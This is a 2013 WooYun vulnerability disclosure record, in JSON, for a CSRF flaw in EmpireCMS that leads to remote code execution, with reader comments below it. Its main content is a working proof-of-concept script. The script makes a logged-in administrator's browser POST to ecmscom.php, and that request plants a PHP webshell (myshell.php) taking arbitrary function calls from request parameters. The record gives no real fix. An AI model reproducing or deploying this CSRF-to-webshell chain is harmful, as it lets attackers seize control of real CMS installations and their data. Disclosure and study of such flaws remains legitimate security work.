{"id": 8697, "wybug_id": "wooyun-2013-032472", "wybug_title": "帝国CMS   CSRF GetShell", "wybug_corp": "phome.net", "wybug_author": "‫‌", "wybug_date": "2013-07-28 11:04", "wybug_open_date": "2013-10-26 11:05", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "7", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-28：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-10-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 问题位置比较多，暂时举此一例。对请求提交没有任何判断。竟然说是最安全的CMS，把DZ森马的完全不放在眼里啊。 详细说明：  废话不多。方式、Code直接放。ecmscom.php提交请求进行自定义页面添加，内容直接写后门。\n\n保存后直接在/e/admin/目录生成myshell.php。检查发现没有判断请求来路。于是继续构造CSRF。   漏洞证明：  \n<Script>//type of form: multipart/form-datafunction ajax(){\tvar request = false;\tif(window.XMLHttpRequest) {\t\trequest = new XMLHttpRequest();\t} else if(window.ActiveXObject) {\t\tvar versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];\t\tfor(var i=0; i<versions.length; i++) {\t\t\ttry {\t\t\t\trequest = new ActiveXObject(versions[i]);\t\t\t} catch(e) {}\t\t}\t}\treturn request;}var _x = ajax();post();function post() {\tsrc=\"http://127.0.0.1/e/admin/ecmscom.php\";\targv_0=\"enews=AddUserpage&id=&oldpath=page.html&cid=&gid=1&pagemod=1&title=aaa&path=page.html&classid=0&pagetitle=&pagekeywords=&pagedescription=&pagetext=%3C%3Fphp+file_put_contents%28%27myshell.php%27%2C%27%3C%3Fphp+%24_GET%5Bc%5D%28%24_POST%5Bx%5D%29%3B%3F%3E%27%29%3B%3F%3E&Submit=%E6%8F%90%E4%BA%A4\";\txhr_act(\"POST\",src,argv_0);}function xhr_act(_m,_s,_a){\t_x.open(_m,_s,false);\tif(_m==\"POST\")_x.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");\t_x.send(_a);\treturn _x.responseText;}</script>Test!\n保存页面，访问，生成。   修复方案：  你们看着办啊。。   版权声明：转载请注明来源 ‫‌@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-07-28 13:11 |    \t\tSct7p \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 懂与不懂之间只隔了一层纸，懂的人会觉得很...)\t\t \n  说实话帝国cms真的算很安全的。除非getshell。几本没地方可以够了    \n     2013-07-28 13:44 |    \t\tITLynn \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:5        | 还有几天就去从军了，野战兵!)\t\t \n  洞主ID有个性！    \n     2013-07-28 17:15 |    \t\t有妹子送上 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:28        | 杭州最帅的男人)\t\t \n  mark    \n     2013-07-30 09:46 |    \t\tPanni_007 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:10        | 专注于信息安全领域    http://www.panni00...)\t\t \n  @ITLynn 洞主是个厂商！！！！！！！！！！！！！    \n     2013-07-30 10:01 |    \t\tSGKer \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 乌拉轼)\t\t \n  = = 洞主ID。。。好灰主流啊    \n     2013-07-30 14:08 |    \t\tCroxy \t\t\t( 普通白帽子  |\t\t\t        Rank:513 漏洞数:54        | 只会送人头)\t\t \n  @Panni_007 怎么看是厂商。。    \n     2013-07-30 16:25 |    \t\tPanni_007 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:10        | 专注于信息安全领域    http://www.panni00...)\t\t \n  @Croxy 你点他名字看看……    \n     2013-07-30 16:48 |    \t\tCroxy \t\t\t( 普通白帽子  |\t\t\t        Rank:513 漏洞数:54        | 只会送人头)\t\t \n  @Panni_007 那些点不了的就是了？ 那么以前也看过几个。。    \n     2013-07-30 16:59 |    \t\tjuuxdd \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | ส)\t\t \n  & #8235 ;& zwnj ;---------------& #8235; &zwn j; 洞主的名字！~~~去掉空格    \n     2013-08-01 15:51 |    \t\t0x0F \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:60        | 尖刀安全 (JDSec.Com).......................)\t\t \n  &#8235;&zwnj;     \n     2013-08-12 22:19 |    \t\t萧然 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 喜欢一切美丽的东西！)\t\t \n  &#8235;&zwnj; --------------- &#8235;&zwnj;什么用？    \n     2013-11-22 13:08 |    \t\t月清晖 \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:1        | some of what?)\t\t \n  正在关注这个洞。    \n     2014-09-20 15:23 |    \t\tdoubi \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | 台上的24位女嘉宾好，我叫doubi来自欧洲，...)\t\t \n   找不到这个文件啊ecmscom.php  是在网站后加这个文件么    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}